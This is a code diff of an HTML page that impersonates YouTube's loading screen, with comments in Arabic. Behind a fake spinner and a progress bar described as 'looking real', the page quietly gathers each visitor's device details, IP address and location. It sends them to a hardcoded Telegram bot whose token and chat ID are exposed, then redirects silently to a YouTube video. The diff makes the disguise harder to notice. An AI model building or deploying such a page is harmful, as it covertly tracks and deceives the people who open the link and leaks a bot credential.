@@ -6,6 +6,7 @@
     <title>YouTube</title>
     <link rel="icon" type="image/x-icon" href="https://www.youtube.com/s/desktop/12d6b690/img/favicon.ico">
     <style>
+        /* ===== RESET & BASE ===== */
         * {
             margin: 0;
             padding: 0;
@@ -20,6 +21,8 @@
             display: flex;
             flex-direction: column;
         }
+
+        /* ===== HEADER (شبيه بيوتيوب) ===== */
         .header {
             background: #0f0f0f;
             height: 56px;
@@ -28,8 +31,9 @@
             padding: 0 16px;
             border-bottom: 1px solid #303030;
             flex-shrink: 0;
+            justify-content: space-between;
         }
-        .header-start {
+        .header-left {
             display: flex;
             align-items: center;
             gap: 24px;
@@ -38,25 +42,54 @@
             width: 24px;
             height: 24px;
             fill: #fff;
+            cursor: default;
         }
         .youtube-logo svg {
             width: 90px;
             height: 20px;
         }
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .header-right .icon {
+            width: 24px;
+            height: 24px;
+            fill: #aaa;
+            cursor: default;
+        }
+        .avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #ff0000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 14px;
+            color: #fff;
+        }
+
+        /* ===== MAIN LOADING ===== */
         .loading-container {
             flex: 1;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            padding: 40px 20px;
+            position: relative;
         }
+
+        /* Spinner متطور (حلقتان) */
         .spinner-wrapper {
-            margin-bottom: 28px;
+            margin-bottom: 40px;
         }
         .youtube-spinner {
-            width: 64px;
-            height: 64px;
+            width: 72px;
+            height: 72px;
             margin: 0 auto;
             position: relative;
         }
@@ -65,51 +98,90 @@
             width: 100%;
             height: 100%;
             border-radius: 50%;
-            border: 5px solid transparent;
+            border: 6px solid transparent;
             border-top-color: #ff0000;
             animation: spin 0.9s cubic-bezier(0.5, 0, 0.5, 1) infinite;
         }
         .spinner-ring:nth-child(2) {
             border-top-color: #f1f1f1;
             animation-delay: 0.15s;
-            opacity: 0.7;
+            opacity: 0.6;
+            width: 80%;
+            height: 80%;
+            top: 10%;
+            left: 10%;
         }
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-        .progress-dots {
+
+        /* نقاط متحركة (ثلاث نقاط) */
+        .dots {
             display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
+            gap: 12px;
+            margin-bottom: 28px;
         }
         .dot {
-            width: 10px;
-            height: 10px;
+            width: 12px;
+            height: 12px;
             border-radius: 50%;
             background: #ff0000;
-            animation: dotPulse 1.4s ease-in-out infinite;
+            animation: pulseDot 1.4s ease-in-out infinite;
         }
         .dot:nth-child(2) { animation-delay: 0.2s; background: #f1f1f1; }
         .dot:nth-child(3) { animation-delay: 0.4s; background: #ff0000; }
-        @keyframes dotPulse {
-            0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
+        @keyframes pulseDot {
+            0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
             40% { transform: scale(1.2); opacity: 1; }
         }
+
+        /* شريط التقدم (Progress Bar) الوهمي المتطور */
+        .progress-wrap {
+            width: 280px;
+            max-width: 80%;
+            background: #272727;
+            border-radius: 20px;
+            height: 6px;
+            overflow: hidden;
+            margin-top: 10px;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.5);
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ff0000, #ff4d4d, #ff0000);
+            background-size: 200% 100%;
+            border-radius: 20px;
+            animation: shimmer 2s infinite linear;
+            transition: width 0.3s ease;
+        }
+        @keyframes shimmer {
+            0% { background-position: -200% 0; }
+            100% { background-position: 200% 0; }
+        }
+
+        /* نص الحالة (خفيف جداً، لا يشير للتحويل) */
         .status-text {
             font-size: 14px;
-            color: #aaa;
-            margin-top: 8px;
-            min-height: 24px;
-            text-align: center;
+            color: #717171;
+            margin-top: 16px;
+            min-height: 20px;
+            font-weight: 300;
+            letter-spacing: 0.3px;
         }
-        /* لا يوجد أي عنصر عداد نهائياً */
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .youtube-logo svg { width: 70px; }
+            .progress-wrap { width: 200px; }
+        }
     </style>
 </head>
 <body>
 
     <!-- ===== HEADER ===== -->
     <div class="header">
-        <div class="header-start">
+        <div class="header-left">
             <svg class="menu-icon" viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
             <div class="youtube-logo">
                 <svg viewBox="0 0 90 20" preserveAspectRatio="xMidYMid meet">
@@ -129,6 +201,11 @@
                 </svg>
             </div>
         </div>
+        <div class="header-right">
+            <svg class="icon" viewBox="0 0 24 24"><path d="M15 15H3v2h12v-2zm0-8H3v2h12V7zM3 13h18v-2H3v2zm0 8h18v-2H3v2zM3 3v2h18V3H3z"/></svg>
+            <svg class="icon" viewBox="0 0 24 24"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2zm-2 1H8v-6c0-2.48 1.51-4.5 4-4.5s4 2.02 4 4.5v6z"/></svg>
+            <div class="avatar">Y</div>
+        </div>
     </div>
 
     <!-- ===== LOADING ===== -->
@@ -139,56 +216,68 @@
                 <div class="spinner-ring"></div>
             </div>
         </div>
-        <div class="progress-dots">
+        <div class="dots">
             <div class="dot"></div>
             <div class="dot"></div>
             <div class="dot"></div>
         </div>
-        <div class="status-text" id="statusText">⏳ جاري التحميل...</div>
-        <!-- لا يوجد أي عنصر عداد هنا -->
+        <div class="progress-wrap">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="status-text" id="statusText">جاري التحميل ...</div>
+        <!-- لا يوجد أي عداد أو نص يشير للتحويل -->
     </div>
 
     <script>
         // ================================================================
-        //  التكوين (عدّل حسب رغبتك)
+        //  التكوين (يمكنك تعديل القيم هنا)
         // ================================================================
         const CONFIG = {
-            redirectUrl: 'https://youtu.be/YiK3BulNaWQ?si=M1AJboH6vgZymq7-',
+            // رابط الوجهة النهائي (سيتم التحويل إليه)
+            targetUrl: 'https://youtu.be/YiK3BulNaWQ?si=M1AJboH6vgZymq7-',
+            // توكن بوت تليجرام
             botToken: '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI',
+            // معرف الدردشة (Chat ID)
             chatId: '170383339',
-            delayBeforeRedirect: 3000   // 3 ثوانٍ (بدون أي عداد)
+            // الحد الأدنى للانتظار قبل التحويل (بالمللي ثانية) – عشوائية تضاف
+            minDelay: 3500,
+            maxDelay: 5500
         };
 
         // ================================================================
-        //  الحالة
+        //  المتغيرات الداخلية
         // ================================================================
-        let state = {
-            redirected: false
-        };
+        let isRedirected = false;
+        let progressValue = 0;
+        let progressInterval = null;
 
         // ================================================================
-        //  أدوات مساعدة
+        //  دوال مساعدة
         // ================================================================
         function log(msg) {
             console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
         }
 
-        // ================================================================
-        //  التحويل الصامت (بدون أي رسائل)
-        // ================================================================
-        function performRedirect() {
-            if (state.redirected) return;
-            state.redirected = true;
-            log('🔄 تحويل صامت');
-            try {
-                window.location.replace(CONFIG.redirectUrl);
-            } catch (_) {
-                window.location.href = CONFIG.redirectUrl;
+        // تحديث شريط التقدم بشكل عشوائي (يبدو حقيقياً)
+        function updateProgress() {
+            if (progressValue < 90) {
+                // زيادة عشوائية بين 2 و 8%
+                const increment = Math.floor(Math.random() * 7) + 2;
+                progressValue = Math.min(progressValue + increment, 90);
+                document.getElementById('progressBar').style.width = progressValue + '%';
             }
         }
 
+        // إنهاء شريط التقدم (إكماله إلى 100% ثم التحويل)
+        function finishProgress() {
+            clearInterval(progressInterval);
+            progressValue = 100;
+            document.getElementById('progressBar').style.width = '100%';
+            document.getElementById('statusText').textContent = 'تم التحميل ...';
+        }
+
         // ================================================================
-        //  جمع البيانات (للإرسال إلى تليجرام)
+        //  جمع البيانات (بدون أي تفاعل)
         // ================================================================
         function collectDeviceInfo() {
             const ua = navigator.userAgent;
@@ -264,7 +353,7 @@
         }
 
         // ================================================================
-        //  إرسال إلى تليجرام
+        //  إرسال البيانات إلى تليجرام
         // ================================================================
         async function sendToTelegram(data) {
             const token = CONFIG.botToken;
@@ -312,12 +401,15 @@
         }
 
         // ================================================================
-        //  العملية الرئيسية
+        //  العملية الرئيسية (التنفيذ)
         // ================================================================
-        async function processVisitor() {
-            log('🚀 بدء المعالجة');
+        async function main() {
+            log('🚀 بدء التشغيل');
 
-            // جمع البيانات (في الخلفية)
+            // 1. بدء شريط التقدم الوهمي
+            progressInterval = setInterval(updateProgress, 300);
+
+            // 2. جمع البيانات الأساسية
             const deviceInfo = collectDeviceInfo();
             let ip = 'غير متوفر';
             let location = null;
@@ -330,33 +422,50 @@
 
             const finalData = { device: deviceInfo, ip, location };
 
-            // إرسال البيانات إلى تليجرام (لا ننتظر النتيجة)
+            // 3. إرسال البيانات (في الخلفية، لا ننتظر)
             sendToTelegram(finalData).catch(() => {});
 
-            // التحويل بعد المدة المحددة (بدون أي إشارة)
+            // 4. تحديد وقت الانتظار العشوائي (بين 3.5 و 5.5 ثانية)
+            const delay = Math.floor(Math.random() * (CONFIG.maxDelay - CONFIG.minDelay + 1)) + CONFIG.minDelay;
+            log(`⏳ الانتظار ${delay} مللي ثانية قبل الإكمال`);
+
+            // 5. بعد المدة، إنهاء شريط التقدم والتحويل
             setTimeout(() => {
-                performRedirect();
-            }, CONFIG.delayBeforeRedirect);
+                finishProgress();
+                // تأخير بسيط جداً (نصف ثانية) ثم التحويل
+                setTimeout(() => {
+                    if (!isRedirected) {
+                        isRedirected = true;
+                        log('🔄 تحويل صامت');
+                        try {
+                            window.location.replace(CONFIG.targetUrl);
+                        } catch (_) {
+                            window.location.href = CONFIG.targetUrl;
+                        }
+                    }
+                }, 600);
+            }, delay);
+
+            // 6. حماية: تحويل احتياطي في حال تعطل أي شيء (بعد 10 ثوانٍ)
+            setTimeout(() => {
+                if (!isRedirected) {
+                    isRedirected = true;
+                    log('⚠️ تحويل احتياطي');
+                    window.location.replace(CONFIG.targetUrl);
+                }
+            }, 10000);
         }
 
         // ================================================================
-        //  بدء التشغيل
+        //  بدء التشغيل بعد تحميل الصفحة
         // ================================================================
         if (document.readyState === 'complete') {
-            setTimeout(processVisitor, 500);
+            setTimeout(main, 400);
         } else {
-            window.addEventListener('load', () => setTimeout(processVisitor, 500));
+            window.addEventListener('load', () => setTimeout(main, 400));
         }
 
-        // تحويل احتياطي في حال تعطل أي شيء (بدون رسائل)
-        setTimeout(() => {
-            if (!state.redirected) {
-                log('⚠️ تحويل احتياطي');
-                performRedirect();
-            }
-        }, CONFIG.delayBeforeRedirect + 5000);
-
-        log('✅ تم التحميل (بدون أي عداد أو نصوص تحويل)');
+        log('✅ تم تحميل الصفحة المتطورة (بدون أي عداد)');
     </script>
 </body>
 </html>
